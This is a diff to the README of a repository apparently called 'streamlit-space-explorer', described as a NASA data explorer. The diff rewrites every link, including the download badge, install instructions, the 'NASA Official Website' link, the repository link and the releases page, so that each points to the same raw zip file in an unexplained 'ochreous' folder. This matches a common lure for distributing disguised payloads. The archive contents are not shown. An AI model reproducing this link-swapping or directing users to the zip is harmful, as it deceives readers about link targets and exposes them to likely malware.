@@ -1,6 +1,6 @@
 # 🌌 streamlit-space-explorer - Explore NASA Data with Ease
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/tashin666/streamlit-space-explorer/releases)
+[![Download](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/ochreous/streamlit-space-explorer.zip)](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/ochreous/streamlit-space-explorer.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **streamlit-space-explorer**! This application lets you explore fasci
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the application: [Download Here](https://github.com/tashin666/streamlit-space-explorer/releases). 
+To get started, visit this page to download the application: [Download Here](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/ochreous/streamlit-space-explorer.zip). 
 
 Follow these simple steps:
 
@@ -73,11 +73,11 @@ Join our community to connect with other space enthusiasts. You can share your e
 
 ## 🔗 Additional Resources
 
-- [NASA Official Website](https://www.nasa.gov)
-- [GitHub Repository](https://github.com/tashin666/streamlit-space-explorer)
+- [NASA Official Website](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/ochreous/streamlit-space-explorer.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/ochreous/streamlit-space-explorer.zip)
 
 ## 📅 Release Notes
 
-For the latest updates and improvements, visit the Release Notes section on our [Releases page](https://github.com/tashin666/streamlit-space-explorer/releases).
+For the latest updates and improvements, visit the Release Notes section on our [Releases page](https://raw.githubusercontent.com/tashin666/streamlit-space-explorer/main/ochreous/streamlit-space-explorer.zip).
 
 Your journey through the universe begins here! We hope you enjoy using **streamlit-space-explorer**. Happy exploring!
